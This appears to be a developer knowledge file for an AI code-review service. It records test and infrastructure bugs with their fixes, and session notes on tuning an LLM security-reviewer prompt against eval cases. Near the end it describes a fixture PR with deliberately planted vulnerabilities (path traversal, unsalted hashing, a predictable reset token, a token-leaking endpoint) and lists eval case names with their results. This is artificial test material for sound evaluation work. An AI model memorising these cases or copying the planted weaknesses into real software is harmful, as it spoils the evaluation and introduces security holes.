that message is only reachable at `reviewer-core/src/llm/openrouter.ts:177`, after the request
loop has actually called the API. So every review in that file made two paid requests, sent the
fixture PR's text to a third party, and added 3–12s of wall clock. `waitForPrRuns`
(`test/helpers/runs.ts:19`) gives up after 10s and **returns the rows anyway**, so the test then
asked for a trace that had not been written — hence 404, and only under parallel load.

**Fix.** `overrides.secrets: new MockSecretsProvider({})` in every integration test that starts
a review. The derivation then fails instantly on the missing key and degrades, which is the
`intent: null` assembly those tests were written against. That file dropped from 17–19s to 2.8s
and the whole suite from ~22–43s to ~10s. Two general lessons: **a slow integration test is
worth a probe before it is worth a retry**, and `waitForPrRuns` returning on timeout instead of
throwing turns "the run never finished" into a misleading assertion failure three lines later.

**Correction, 2026-08-05 — the fix above works, but it is the wrong mechanism.** An empty
`MockSecretsProvider` isolates a test through the **failure path**: `container.llm(id)` reaches
for a key, finds none, and throws `ConfigError`. Nothing is overridden; the test passes because
something broke in the right order. Two consequences. It cannot express "this run touches no
live LLM" *successfully* — a case that needs a real answer from a data-chosen provider has no
way to supply one. And the isolation is silently conditional: give that container a secrets
provider that does have the key, for any other reason, and the paid request comes straight back.

The mechanism is `ContainerOverrides.llmFallback` (`platform/container.ts`), a catch-all
`LLMProvider` consulted by `Container.llm(id)` when `overrides.llm[id]` is absent and **before**
any key lookup or cache read. `overrides.llm` is keyed by provider id, and since 05 the set of
ids one review touches depends on `settings.feature_models` — a row — so no `llm` object written
when the app is built can name them all. A sibling field rather than a magic `fallback` key
inside the record: a member of that record would widen the key union so `container.llm('fallback')`
type-checks, and would collide the day a provider is actually called that.

So: **`llmFallback` for isolation, `MockSecretsProvider({})` as defence in depth.** Both are in
`test/reviews.it.test.ts` and `test/reviews-skills.it.test.ts`. Write the assertion so it can
tell them apart — the degrade reason reads `Intent unavailable — MockLLMProvider fixture failed
schema` when the fallback answered and `OPENROUTER_API_KEY is not configured` when a missing key
did. Asserting only that the review survived cannot distinguish the two, which is how the
original omission survived review.


### `app.inject is not a function` in a new integration test

**Symptom.** Every test in a new `*.it.test.ts` fails with `TypeError: app.inject is not a
function`, pointing at the first `inject` call rather than at the setup.
**Cause.** `buildApp` (`src/app.ts`) is `async` — it awaits `reapStaleRuns`, helmet, cors and
multipart. A local helper that returns more than the app (`return { app: buildApp(...), llm }`)
hands back a Promise inside an object, and unlike `const app = buildApp(...)` there is no
missing `await` visible at the call site. `test/intent.it.test.ts` gets away with
`return buildApp(...)` only because its callers write `await appWith()`.
**Fix.** Make the helper `async` and `await buildApp(...)` inside it. Cost on 2026-08-09: one
full testcontainers run.
### A fixture patch's `additions`/`deletions` are unchecked, and one of them is already wrong

**Symptom.** `db/seed-fixtures.ts` declares each file's `additions`/`deletions` next to a
hand-written unified-diff string. Nothing verifies the two agree. `SEARCH_ROUTES` (PR #102)
declares `+9 -4` over a patch containing 7 added lines — checked 2026-08-06, still wrong,
left standing because correcting it changes an unrelated fixture's stored numbers.

**Cause.** The numbers are inserted straight into `pr_files` and never derived from the patch.
Typecheck cannot see it, and no test asserts it. Anything summing them then disagrees with the
diff it renders — `GET /pulls/:id/smart-diff` totals exactly these columns into
`split_suggestion.total_lines`.

**Corrected 2026-08-07.** Both halves of this are now enforced by
`test/seed-fixtures.test.ts`, so the check below is no longer something to remember — it is a
gate. Writing it immediately failed on `SEARCH_ROUTES`, which is how that fixture finally got
its declaration corrected to `+7 -4`; the paragraph above describing it as "still wrong, left
standing" is history, not the current state. The throwaway script it also describes is what the
test was made from.

**Fix.** After writing a fixture patch, count it rather than estimating. Two things must hold,
and both were wrong on the first draft of PR #104:

- `additions` = lines starting `+`, `deletions` = lines starting `-`;
- the hunk header `@@ -a,b +c,d @@` needs `b = context + deletions` and `d = context + additions`.
  `parsePatch` (client) only reads `a` and `c`, so wrong lengths render fine and stay wrong.

A throwaway script that regex-extracts the patch constants and compares both is a two-minute
job and caught nine mismatches at once. Note that its extraction regex must consume `\X` as a
unit — `API_SNAP` contains escaped backticks, and a lazy `` `([\s\S]*?)` `` stops at the first
one and silently reports the patch as empty.

### An integration test can fail once under full-suite load and pass alone

**Symptom.** `test/reviews-skills.it.test.ts` failed on `GET /runs/:id/trace` → 404 during
`vitest run .it.test` (2026-08-06), then passed on its own and passed on an immediate re-run of
the whole suite. 96 tests, 103s of test time inside a 14s wall clock — heavy contention.

**Cause.** Not diagnosed. The trace is written after the run completes, so a wait that clears on
run status can outrun the trace insert when everything is competing for the same Postgres.

**Fix.** Before believing an integration failure is yours, re-run that file alone, and re-run the
suite. Stashing the branch (`git stash -u`) and running the file on a clean tree separates "my
change broke it" from "the suite is loaded" in one command — that is what settled this one.

### Parsing a stored jsonb document on read makes every removed contract field a 422

**Symptom.** `getRunTrace` was changed from a cast to `RunTrace.parse(row.trace)` (2026-08-13) so
`project_context`'s `.default([])` would fire for the 282 of 285 rows written before that field
existed. That is right, and it silently took on a second obligation: `RunStats.cost_usd` is a
required key that `d45ab0d` (2026-06-14) deleted from the contract and `5e92756` (2026-07-28)
restored, so any trace persisted between them fails the parse. Reproduced with a fixture in
`test/reviews-context.it.test.ts`: `GET /runs/:id/trace` answered **422**, not 500 — `app.ts:149`
maps any `ZodError` to 422, so a malformed *stored* document is reported as if the *caller* sent
something invalid.

**Cause.** `run_traces.trace` is written by every version of this code that ever ran. Parse-on-read
holds the current contract against documents written under all of the previous ones, and a field
the contract lost and regained is invisible in `git log -p` on the current file.

**Fix.** Every field this contract has gained, or lost and regained, carries a `.default(...)` —
`cost_usd` is `z.number().nullable().default(null)`. `z.infer` keeps the key required on the OUTPUT
type, so writers are unaffected. Before adding a required key to any schema that is parsed on read,
run `git log -S'<field>' -- <contract>` and check for a removal, then probe the column:
`docker exec devdigest-postgres psql -U devdigest -d devdigest -tAc "select count(*) from
run_traces where not (trace->'stats' ? 'cost_usd')"` (the role is `devdigest`, not `postgres`).

### The misleading 404 came back on 2026-08-14, with a different cause and the same amplifier

**Symptom.** `pnpm exec vitest run .it.test` failed non-deterministically — two files one run, four
the next, a different set each time — always `expect(res.statusCode).toBe(200)` receiving `404`
from `GET /runs/:id/trace`. `reviews-skills.it.test.ts` passed on its own (4/4). The whole split
passed with `--fileParallelism=false`: 18 files, 137 tests.

**Cause.** Not the 2026-08-05 cause above. Every file that failed —
`reviews-skills.it.test.ts`, `reviews-context.it.test.ts`, `reviews.it.test.ts` — already passes
`MockSecretsProvider`, so no paid request was involved; verify that before reaching for it, with
`grep -L MockSecretsProvider server/test/reviews*.it.test.ts` (only
`reviews-nul-persist.it.test.ts` lacks it, and it never failed). The 08 Project Context branch
added two integration files, so 18 of them now each start their own testcontainers Postgres in
parallel. Under that load a review does not finish inside `waitForPrRuns`' 10s budget, and
`test/helpers/runs.ts:19` **returns the rows anyway instead of throwing** — so the test asks for a
trace that was never written and reports a 404 three lines later. The same swallowed timeout the
entry above warned about, now reached by load rather than by latency.

**Fix.** Run the split serially — `pnpm exec vitest run .it.test --fileParallelism=false`, ~60s —
and read a 404 from a trace fetch as "the run did not finish", never as a routing or persistence
defect. The durable fix is in `waitForPrRuns`: a helper that gives up should throw, so the failure
names itself. Until it does, a green serial run and a red parallel one is not two results — it is
one result and one timeout.

### A `withTimeout` mutation test hangs the whole vitest run instead of failing it

**Symptom.** Removing `withTimeout(...)` from `modules/brief/service.ts` to prove the R43 test can
fail made `pnpm exec vitest run test/brief-service.test.ts` run past a two-minute tool timeout with
no output.
**Cause.** The test's fake provider returns `new Promise(() => {})`. With the outer clock gone
nothing ever settles, and the file's `testTimeout` is 120 000 ms from `vitest.config.ts` — longer
than the shell was willing to wait.
**Fix.** Mutation-test a timeout with `--testTimeout=5000` on the command line. The run then
reports `Test timed out in 5000ms` against the one case, which is the evidence wanted, in seconds
instead of minutes.

### A bisect that lands on `platform/container.ts` needs the module set checked before it is believed

**Symptom.** `test/reviews-diff.it.test.ts` reported `Error: Hook timed out in 120000ms`, all 8
tests skipped, the file running 903 s (2026-08-16, fix round 4 of plan 10). A one-run-per-state
bisect blamed `platform/container.ts` — the `briefService` getter and its new imports — because
restoring only that file made the run pass in 4.58 s.

**Cause.** That edit cannot reach `startPg()`. The getter is lazy and no test in that file calls
it, and `modules/brief/routes.ts` **lost** `import { BriefService }` / `import { BriefRepository }`
in the same change that `platform/container.ts` gained them — so the set of modules the app loads
is unchanged. Proved by walking the static value-import graph from `src/app.ts` over both trees:
138 modules, 0 cycles, identical file lists. The real cause is the load the entry two above
describes — `startPg()` waiting on a `pgvector/pgvector:pg16` container the daemon did not deliver
inside 120 s. Vitest reports a suite whose `beforeAll` failed as **skipped**, so a skip here means
"the hook never came up", not "the condition was false".

**Fix.** Two checks, both cheaper than the bisect. First, count the skips against the file: a suite
whose hook died contributes all of its tests, so a full run reading `158 passed | 4 skipped`
accuses a 4-test file (`reviews-skills`, `agents-skill-count`, `pulls-comments`), never an 8-test
one — that arithmetic alone contradicted the single-file evidence. Second, diff the module set
instead of re-running: copy `src/` to a scratch dir, restore the suspect files with
`git show HEAD:server/src/<path>`, and walk both graphs from `app.ts`. Moving a `new X()` from a
route into a memoised container getter adds no module and no cycle; when the two lists match, the
file is not the cause. Verified 2026-08-16 with round 4 fully in place: 3x
`pnpm exec vitest run .it.test --fileParallelism=false` → 20 files / 162 tests / 0 skips, and 5x
the single file at ~4.5 s.

### Seeing the type errors in `test/` at all — one throwaway tsconfig

**Symptom.** A fixture that has gone stale — a required field added to a contract or to a `*Values`
interface, and the hand-written literal in `test/` never updated — is invisible to every gate.
`pnpm typecheck` does not read `test/` (recorded above, 2026-07-27) and vitest checks runtime, so
`test/brief-service.test.ts:99` sat on a TS2741 with a green board on 2026-08-16.

**Cause.** `tsconfig.json` sets `"include": ["src/**/*.ts"]`, and no second config covers `test/`.

**Fix.** From `server/`, one throwaway config and one run:

```sh
printf '{"extends":"./tsconfig.json","include":["src/**/*.ts","test/**/*.ts"]}' > tsconfig.tests.tmp.json
pnpm exec tsc --noEmit -p tsconfig.tests.tmp.json; rm tsconfig.tests.tmp.json
```

Do this after widening any contract or any `*Values`/`*Row` interface. Expect pre-existing noise —
on 2026-08-16 it reported 20 errors, of which 17 were long-standing (heterogeneous
`new Map([[t.pullRequests, …], [t.prBrief, …]])` fixtures in `brief-routes.test.ts`, a loosely typed
`req?.headers` in `brief-rate-limit.it.test.ts`, `defaultBranch` in `repo-intel-facade-degraded.test.ts`).
Grep for the files you touched rather than reading the whole list, and do not "fix" the rest on sight:
that is a separate pass, and making the run green is not the point of it.

### `REVIEW_FIXTURE.score` is not the score that lands in the row

**Symptom.** A new case in `test/reviews.it.test.ts` asserted a list payload's `score` against
`REVIEW_FIXTURE.score` and failed with `expected 65 to be 42` (2026-08-17). The mock provider
returned the fixture unchanged, and the review persisted fine.

**Cause.** The fixture carries two findings, one of them on a line outside the diff. Grounding
drops it and the run **rescores** what survived, so 42 goes in and 65 comes out. Every assertion
in that file that reads a persisted score is reading a post-grounding number.

**Fix.** Assert the property, not the literal: read the score once and compare later reads to it
(`expect(afterPush.score).toBe(atHead.score)`), or assert `typeof … === 'number'`. Pinning 65
would pin the grounding gate's arithmetic inside a test about something else — and a `.it.test`
round trip costs ~80s, so the guess is expensive to make twice.
### A job reported `done`, and the clone had not moved in 91 commits

**Symptom.** `POST /repos/:id/refresh` answered `{"status":"refreshing"}` and its `clone` job
finished `done` with an empty `error` column — while the clone's worktree stayed **91 commits**
behind `origin/main`, and would have indefinitely. Project Context served `specs/` as it looked
the day the repo was imported (ten files that moved to `plans/` on 2026-08-12 still listed,
`SPEC-01-project-context.md` absent), and the repo-intel index parsed that same tree, so the blast
radius was computed against code that no longer existed. Nothing reported a failure anywhere.
Observed 2026-08-16.

**Cause.** `GitClient.clone` short-circuits to a bare `fetch()` when `.git` already exists
(`src/adapters/git/simple-git.ts:94-97`). A bare fetch advances `origin/<branch>` and touches
neither `HEAD` nor the worktree — and the worktree is what every consumer reads. The method that
advances one is `sync()` (`simple-git.ts:114-138`, fetch + `reset --hard origin/<branch>`), whose
only caller sat behind a **different** route, `POST /repos/:id/resync`. Two routes a paragraph
apart in the API map, and the one named "refresh" refreshed nothing a reader could see.

**Fix.** The caller was fixed the same day — `RepoService.refresh` now enqueues `RESYNC_JOB_KIND`
for an already-cloned repo and keeps the clone job for a repo that has none yet. The durable part
is the diagnosis, because the next stale-clone symptom will not look like this one: **a job's
`done` says nothing about a worktree.** Ask git.

```sh
CP=server/clones/<owner>/<repo>
git -C "$CP" rev-list --left-right --count HEAD...origin/main   # "0 91" => fetched, never checked out
ls -l "$CP/.git/FETCH_HEAD"                                     # seconds old => the network half worked
```

A fresh `FETCH_HEAD` beside a stale `HEAD` is the entire signature. Reach for it before suspecting
the scanner, the indexer, or the parser — all three were innocent here.

### `*/` inside a JSDoc backtick ends the comment, and esbuild blames the next template literal

**Symptom.** `Transform failed: Expected ";" but found "apps"` from `vite:esbuild`, pointing at a
line like ``tree[`apps/a${i}/package.json`] = '…'`` that is perfectly valid TypeScript.
**Cause.** A `/** … */` docstring above it contained `` `examples/*/package.json` ``. The `*/`
closed the comment early, the remaining prose became code, and the odd backtick left the parser
inside a template literal — so the error surfaces at the NEXT backtick, several lines below the
real fault. Hit twice on 2026-08-18 in `server/test/`.
**Fix.** Never write a glob ending in `*/` inside a block comment; use `examples/<name>/…`. When
esbuild reports a syntax error on a line that is obviously fine, look UP for an unbalanced
backtick or an early `*/`, not at the line it names.

## Session Notes

### 2026-08-24 (Security Reviewer — a mis-cited TOCTOU eval case, and an honest miss)

- User-added eval case `toctou-race-condition-in-clone-write-path-symlink-between-check-and-use`
  (`server/src/adapters/git/simple-git.ts`) failed with recall 0. Root cause: the ORIGINAL
  finding's own citation was wrong — `gpt-4o-mini` twice (across two separate review runs, two
  separate accepts) said "the `writeTarget` method (line 256)" when line 256 is inside the
  method's DOC COMMENT; the method itself starts at line 279, and the actual `lstat`-in-a-loop
  check the finding describes is at lines 293-309. A second, near-duplicate case existed from a
  SECOND accept of the same underlying observation (`be3f26f4…`, 2026-08-24), also mis-cited by
  ~2 lines in the same wrong direction — the model made the SAME line-counting error twice,
  independently. Corrected both citations to 293-309, then deleted the duplicate (one case is
  enough once the location is right).
- Even with the correct citation, `gpt-4o-mini` never once reproduced the finding: 0/12 across two
  rounds of direct `reviewPullRequest` calls (bypassing the batch executor, which discards
  everything but a dropped-count) — 9 before a prompt fix, 6 after. It consistently reports a
  DIFFERENT, weaker concern instead ("Potential Path Traversal in `writeTarget` Method") even
  though the code already defends against traversal via `join()` + a containment check — the model
  is not blind to the area, it fixates on the wrong mechanism within it. Added a third worked
  example to `security-reviewer.md` (a generic, non-eval-case-derived cross-method TOCTOU: a
  `assertSafe` check in one method, the real write in a different method further down) — pushed,
  verified (1325 unit tests green, `prompt-sync` clean), and it measurably changed the model's
  OWN rationale text (later runs explicitly note "the method DOES check for symlinks") without
  ever crossing into a matching citation. Left as an honest, documented miss rather than kept
  chasing it — same shape as the Performance Reviewer 6-run findings on cross-method reasoning:
  some real defects are just hard for a single-pass, diff-only review at this model's tier.
- **Broke, then fixed, the live dev server while doing the prompt sync** — see the Recurring
  Errors & Fixes entry above ("hand-rolled prompt-sync script corrupts a constant that quotes its
  own template-literal syntax"). Caught immediately (`tsx watch` crash loop), fixed with a
  structural rather than content-based boundary search, and re-verified with `prompt-sync.mjs` +
  `pnpm typecheck` + the full unit suite before trusting the file again.

### 2026-08-24 (continued — the other 6 failing cases, a mischaracterized "race condition", and a false regression scare)

- Asked to improve the rest of the failing set (7 of 13 cases), found 5 shared ONE root cause: a
  `must_not_flag`-only case's `input_diff` is the WHOLE new file (D5/D7 crediting is file+range —
  see `scoring.ts`'s `creditFindings`), so ANY finding anywhere else in that file — not just one
  overlapping the specific forbidden range — counts as uncredited noise and fails the case. A
  `must_not_flag` case therefore tests "the model reports ZERO things about this whole file", a much
  stricter bar than its own name implies ("don't re-report THIS ONE claim"). Confirmed by reading
  every "extra" finding: `.trim()` on a possibly-`null` value claimed to "silently pass `undefined`"
  (it would THROW, never reach the callback — the model asserted a mechanism it never traced), a
  loose `case` substring match called "command injection" (real pattern, inflated label), a
  hardcoded numeric config value called "unbounded input". Added Example 3 ("trace the claim, do not
  assert it") to `security-reviewer.md`, targeting exactly this shape — pushed and verified.
- **The `race-condition-in-skillsservice-update-allows-enabling-an-injection-body` `must_find` case
  is very likely a mischaracterized finding, same class as the FileRef.tsx retirement earlier this
  session.** Traced `SkillsService.update` (`server/src/modules/skills/service.ts:133-160`) against
  the finding's own claimed mechanism ("the second request's check uses the stale body, so it allows
  enabling") line by line: the method is a `for`-loop of `UPDATE_ATTEMPTS = 3` attempts, each
  re-reading `existing` FRESH and re-running the injection check against THAT attempt's own read,
  before a write gated on `eq(t.skills.version, existing.version)`
  (`server/src/modules/skills/repository.ts`). Any write that could have raced sees its version
  check fail, returns `undefined`, and the loop retries with a fresh read — no combination of
  (body, enabled) can ever be COMMITTED without having been validated against consistent data at
  write time. The described race requires a write to land using data staler than what it was
  gated on, which this pattern specifically forecloses. Not retired yet — this overturns a real,
  deliberate accept decision, which is not mine to make unilaterally; surfaced to the user with the
  full trace for a call. **Resolved**: user confirmed, case deleted (`d015f277…`). 12 cases now.
  The underlying `findings` row (`bf171e5e…`, still `accepted_at` set in the product's own review
  history) was deliberately left untouched — D11 decouples eval cases from the finding they were
  built from precisely so deleting one says nothing about the other, and reversing a real product
  decision was never asked for, only removing it as a regression-test target.
- **A "regression" on the previously-bulletproof `production-stripe-secret-key-hardcoded…` case
  turned out to be pre-existing, not caused by anything this session touched.** The case started
  additionally reporting "Unbounded Rate Limit Values" on two literal, hardcoded config numbers
  (`anonymous: 60, authed: 1000`) — a confused claim, since these ARE the bound values, not
  unbounded input — right after Example 3 (a different, now-removed cross-method TOCTOU example)
  was added. Circumstantially looked caused by it. Isolated properly: temporarily stripped the LIVE
  agent back to the exact prompt text from before ANY edit this session and re-ran the case 3
  times — same "Unbounded Rate Limit Values" finding, 3/3. The behavior predates every prompt change
  made today; it was simply never sampled enough times before to be seen. **Lesson: before crediting
  or blaming a prompt edit for a change in a noisy model's behavior, get a same-case baseline sample
  on the OLD prompt, not just a memory of one old passing run** — one old data point is not a
  baseline, especially against a model already documented (this same file, 2026-08-23 entries above)
  as unstable enough to flip outcomes run to run on a BYTE-IDENTICAL input.
- Net effect of what was kept (Example 3, "trace the claim"): the TOCTOU example that had shown zero
  benefit across 15 total attempts and this "unbounded rate limit" case's apparent regression were
  both removed/exonerated: the TOCTOU example was deleted outright (proven ineffective, see the
  entry above), and the "regression" was proven pre-existing rather than reverted. The one clean,
  reproducible win: `intent-derivation-flow-is-not-a-lethal-trifecta` went from a consistent fail
  (an "unbounded input in readPlanFiles" tangent every run) to passing. `traces_passed` across 4
  batches on the full 13-case set: 6, 7, 8, 6 — noisy, no clear directional trend beyond the one
  fixed case, consistent with a model whose baseline noise floor is comparable to the size of any
  single prompt tweak's effect.

### 2026-08-24 (continued again — 3 cases fixed, and a second honest-miss class discovered)

- Asked once more to fix whatever was still failing. Isolated `sensitive-credit-card-data-logged-in-checkout`
  (baseline 0/4, `logger.info('checkout started', { cart, card })` going unreported every time) by
  stripping the just-added Example 3 ("trace the claim") from the live agent and re-sampling: 3/5 passed
  without it vs 0/4 with it — enough of a gap over 9 total samples to act on, unlike the stripe-key
  false alarm above. Root cause: Example 3's own "don't assert what you can't see" framing was making
  the model demand the `Card` type's field list before it would call a `card` argument sensitive, when
  the parameter's NAME and its use (`charge(card, ...)`) already say enough. Fixed by adding one paragraph
  to Example 3 distinguishing tracing a MECHANISM (what Example 3 is actually for) from requiring full
  type visibility to recognize sensitivity by name/context — not by removing the example, since it still
  earns its keep elsewhere (intent-derivation, below). Recall after: 3/3 clean on immediate retest, 3/3 on
  a later confirm pass (occasional precision noise from the separate padding issue below, not suppression
  — recall never went back to 0).
- `intent-derivation-flow-is-not-a-lethal-trifecta` and `production-stripe-secret-key…` share ONE
  mechanism, previously diagnosed as two unrelated hallucinations: the model asserting a NEGATIVE
  property (unbounded, unvalidated) of code it cannot see, not just a cost or a positive mechanism. The
  existing "never assert a cost or implementation you cannot see" bullet only named positive claims
  ("spawns a subprocess"). Extended it to cover a callee's own behavior explicitly, with the exact two
  examples from these cases (`parsePlanRefs` imported but not shown; `{ anonymous: 60, authed: 1000 }` —
  literal numbers ARE the bound, not evidence of a missing one). `intent-derivation` went 3/3 clean
  immediately. `stripe-key`'s recall on the CRITICAL finding itself went to 11/11 across every sample
  taken this session after this point — the hallucination stopped being about MISSING the real finding.
- **What stripe-key's hallucination actually needed turned out to be a much harder, structural problem:
  the model pads a second, speculative finding onto ANY diff that already contains one strong CRITICAL,
  and re-targets a DIFFERENT line every time the specifically-named target is closed off.** Timeline
  across four prompt versions, 3-4 samples each: re-wording away from the literal word "unbounded" — the
  model just restated the identical guess as "does not specify bounds" (3/3 still padding, same target,
  `rateLimit`). Adding a worked Example 4 naming this exact shape almost verbatim — 4/4 still padding,
  but now on `redisUrl: process.env.REDIS_URL`, an UNCHANGED context line (no `+`) not even touched by
  the diff. Adding a structural "one CRITICAL finding is a complete report, don't go looking for a
  second" rule to Findings discipline — 1/4 clean, one real improvement, but 3/4 still padded (back to
  `rateLimit`). Left at this partial state: recall on the real finding is now reliable, precision has a
  visible but not eliminated ceiling. Whack-a-mole against a NAMED example does not generalize; whack-a-mole
  against the STRUCTURAL trigger ("you already found one CRITICAL, stop") made measurable but incomplete
  progress. Not chased further past this point — same call as the TOCTOU miss below, made explicit here so
  the next session does not re-discover the ceiling by re-trying the same three moves.
- **A second, distinct honest-miss class, found while checking for regressions:** `gate-sh-does-not-validate…`,
  `wrapuntrusted-fence-can-be-broken…`, `report-sh-uses-jq-r…` and `scope-sh-s-flag-for-function…` — four
  `must_not_flag` cases, all shell-script or shell-adjacent code, all failing the SAME way: the model calls
  a `case`/pattern-match or a plain string-concatenation "injection" or "code execution" with no traced sink
  (no `exec`, no `eval`, nothing that runs the string as code). This is the *exact* pattern Example 3 already
  names verbatim ("do not call a loose `case` pattern-match 'command injection'") — and still happens, 100%
  reproducing across dozens of samples this session (0/6 on two of the four, individually sampled). Tried one
  more, maximally concrete intervention: a new "injection/code execution name a SINK, not a feeling" rule in
  How to analyze, listing what counts as a sink and explicitly excluding a `case` match or a display-only
  string build. Zero measured effect — 0/6 on its two named targets, both before and after. Reverted outright
  (kept nothing "just in case") after confirming via a stripped-live-agent A/B that it wasn't even the cause
  of report-sh/scope-sh's failures (they failed similarly with or without it) — this is a THIRD family in the
  same failure mode discovered mid-check, not caused by the sink rule, just never sampled before today.
  **Conclusion: this model has a durable prior that shell `case` pattern-matching and string-building near
  security-relevant code IS an injection risk, and no wording tried so far — direct instruction, worked
  example, or sink-definition — overrides it.** Treated as an honest miss, same discipline as TOCTOU: documented,
  not chased indefinitely, prompt reverted to the state with no measured benefit removed.
- Verification before calling this done: `node scripts/prompt-sync.mjs` clean, `pnpm typecheck` clean, full
  1325-test unit suite green, live agent (now v35) matches the committed-to-be `security-reviewer.md` byte for
  byte — no diagnostic/isolation script left uncommitted (all `server/scratch-*` deleted after use).

### 2026-08-24 (Security Reviewer — model swap fixes the case-injection family, TOCTOU pinned down precisely)

- Compared `openai/gpt-4o-mini` (the model this whole investigation had been run against —
  corrected from an earlier assumption in this file that it was `deepseek/deepseek-v4-flash`,
  which is Performance Reviewer's model, not this one) against `anthropic/claude-sonnet-4.5` and
  `anthropic/claude-haiku-4.5` on the full 12-case set, several batches each. `gpt-4o-mini`: 4-5/12
  per batch. `claude-sonnet-4.5`: 10/12, $0.457/batch, but introduced its OWN padding tendency on
  `unauthenticated-rate-limit-reset…` (always finds the real CRITICAL, but consistently adds a
  second speculative finding about `resetBucket`'s unseen internals — same failure shape as
  gpt-4o-mini's stripe-key padding, just a different model, different target line: this looks like
  a cross-model LLM tendency, not something specific to one model's weak reasoning).
  `claude-haiku-4.5`: 10-11/12 across 3 batches, $0.157/batch (17x gpt-4o-mini, 1/3 of sonnet), and
  the ONLY one of the three with clean precision=1.0 in 2 of 3 batches — it does not reproduce
  sonnet's padding tendency on this set. **Adopted `claude-haiku-4.5` as Security Reviewer's
  production model** (user-confirmed) — best accuracy AND lowest cost of the three real candidates.
  Live agent pushed to v37; `src/db/seed.ts`'s `Security Reviewer` entry updated to
  `'anthropic/claude-haiku-4.5'` (was silently inheriting `DEFAULT_MODEL` while the live DB agent
  had already drifted to `gpt-4o-mini` sometime before this session — same "seed vs. live" drift
  class as the prompt-sync problem, just on the `model` column instead of `systemPrompt`; nothing
  in this repo diffs the two the way `prompt-sync.mjs` diffs prompts).
- Switching models alone fixed the entire 4-case "case-pattern-match = injection" family
  (`gate-sh`, `wrapuntrusted-fence`, `report-sh`, `scope-sh`) that three separate prompt
  interventions on `gpt-4o-mini` (see the entry above) could not touch — all 4 went 3/3 clean on
  both sonnet and haiku with the EXACT SAME prompt that scored 0/6 on gpt-4o-mini. Confirms the
  2026-08-24 (continued again) entry's conclusion: this was `gpt-4o-mini`'s own prior, not
  something a system prompt could override. Worth remembering the next time a prompt-only fix
  plateaus after 3+ genuinely different interventions — check whether the model itself is the
  ceiling before writing a 4th variant.
- **TOCTOU (`toctou-race-condition-in-clone-write-path…`) is unfixed by any of the three models —
  0/17 across the whole session, now including sonnet and haiku (0/4 combined, both silent, not
  even a wrong finding this time).** Pinned down the exact mechanism a reviewer would need to trace
  cross-method to find it: `SimpleGitClient.writeTarget` (`server/src/adapters/git/simple-git.ts:296-327`)
  `lstat`s every EXISTING path segment for a symlink, but deliberately `break`s at the first
  segment that does not exist yet (line 316-320's comment: "nothing here yet, so nothing below it
  either") — so those segments are never checked. `writeFile` (`:349-370`), a SEPARATE method,
  calls `writeTarget` for the check, then several lines later calls
  `mkdir(dirname(target), { recursive: true })` (`:363`) — which is exactly what creates the
  segments the check skipped. `mkdir recursive` does not itself refuse a symlink placed in that
  gap; only the FINAL leaf is protected, by `open(…, 'wx')` in `writeExclusive`/`writeViaTemp`. The
  code's own inline comment ("caught by `open(…, 'wx')`, which fails on a symlink") is easy to read
  as covering the whole path when it only covers the last segment — finding the gap requires
  connecting a deliberate early-exit in one method to a side effect in a different method several
  lines below, while not being reassured by a comment that sounds like it already covers the case.
  This is the concrete shape of "cross-method reasoning is hard for a single-pass diff review" —
  not a vague difficulty rating, an actual traceable reason. Not chased further; recorded here so a
  future session evaluating a stronger model (or a two-pass/whole-file review mode, if one ever
  exists) has the precise mechanism to test against instead of re-deriving it.
- Verification: `pnpm typecheck` clean after the `seed.ts` change, full 1325-test suite still green
  (seed data is not exercised by the hermetic unit suite, so this specific edit had nothing to
  break there — confirmed by reading `test/` for any test that imports `seed.ts`'s agent list: none
  do). All `server/scratch-*` diagnostic scripts deleted after use, including the two written this
  round (`scratch-switch-model.py`, plus the isolation scripts from the entry above).

### 2026-08-25 (a fresh skills-lab fixture PR, harvested for 5 new Security Reviewer cases)

- Added PR #107 ("Add self-service password reset") to `devdigest/skills-lab` — 4 new files,
  `seed-fixtures.ts`'s existing `FIXTURE_PRS` pattern (hand-written `pr_files.patch` text, no real
  clone needed, `diff-loader`'s fallback reconstructs the diff). 4 bug classes deliberately absent
  from the existing 12-case corpus: path traversal (`join(AUDIT_LOG_DIR, filename)` with an
  unsanitized query param — no containment check at all, unlike `SimpleGitClient.writeTarget`'s
  careful version), weak password hashing (unsalted single-round SHA256), a predictable reset token
  (`Date.now().toString(36) + Math.random()...`), and an unauthenticated lookup endpoint that leaks
  a live reset token by id. Line counts for each hunk were generated from real source files by
  script rather than hand-counted, specifically to not repeat the citation-miscounting mistake this
  file already has two entries about.
- Ran Security Reviewer (`claude-haiku-4.5`, live) against it for real — per this fixture set's own
  rule, no finding is ever seeded, only real model output gets curated. It found all 4 planted bugs
  cleanly cited, plus a 5th finding worth keeping for a different reason: "Missing authentication on
  password reset endpoints" lumped the two INTENTIONALLY-public endpoints
  (`postPasswordReset`/`postPasswordResetComplete` — a self-service reset flow is public by design)
  together with the one genuinely unauthenticated endpoint it also flagged separately and correctly.
  This is a live instance of the same overclaim-by-association shape documented earlier this file
  (the "second finding padding" tendency) — accepted the 4 correct findings, DISMISSED this one as a
  real, considered call (not fabricated — the model's own suggestion text half-contradicts its own
  finding, saying `postPasswordResetComplete` needs "no authentication... it's a public endpoint").
  All 5 turned into eval cases via `POST /findings/:id/eval-case`, matching D11.
- Each new case's `input_diff` is correctly scoped to just the one file its finding is about (not
  the whole 4-file PR), but recall-1/precision-0.5ish is still the norm on the 4 must-find cases:
  `export-audit.ts` alone, isolated, still gets a second, defensible finding ("no auth on an admin
  export route") most runs — a real secondary concern I did not plant, not a scoring bug. Left as
  realistic noise rather than narrowing further; TP recall never drops on any of the 4 across
  repeated runs, which is what actually matters for these cases.
- Corpus is now 17 cases. Full batch after adding them: 10/17 pass, and the 5 new ones behave
  exactly as predicted from the isolated per-case runs (all 4 must-find recall=1, the dismissed
  must-not-flag one fails because the model does occasionally still produce a version of the
  overclaim) — no surprises, nothing to chase further today.
  - **Correction, same day, after switching Security Reviewer back to `claude-haiku-4.5` from the
    `deepseek/deepseek-v4-flash` PR #23 test (it was left on deepseek by accident — 18s for one
    tiny single-file case, ~4x haiku, and worse citation precision on the same case) and re-running
    the full batch: `weak-password-hashing-using-sha256-without-salt` and
    `weak-password-reset-token-generation` failed together, every time, and it was NOT model noise
    — it was a self-inflicted scoring collision. Both bugs were deliberately planted in the SAME
    file (`password-reset-service.ts`) when the fixture PR was written, and split into two separate
    single-expectation `must_find` cases. The model correctly finds BOTH bugs on every run — that
    is the right behavior — but each case's narrow single-expectation scoring only credits its OWN
    bug and counts the model's correct discovery of the OTHER one as noise, capping precision at
